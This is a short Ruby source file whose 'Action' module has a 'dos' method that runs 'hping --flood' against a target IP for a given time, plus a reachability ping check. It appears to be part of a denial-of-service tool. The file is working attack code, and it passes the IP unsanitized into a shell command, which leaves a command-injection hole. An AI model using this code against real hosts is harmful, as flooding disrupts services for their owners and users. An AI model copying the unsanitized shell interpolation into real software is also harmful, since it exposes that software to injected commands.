# encoding: utf-8

module Action

  def self.dos(ip, duration)
    `timeout #{duration} hping --flood '#{ip}' 2>&1`
  end

  def self.ping(ip)
    Net::Ping::External.new(ip).ping?
  end

end
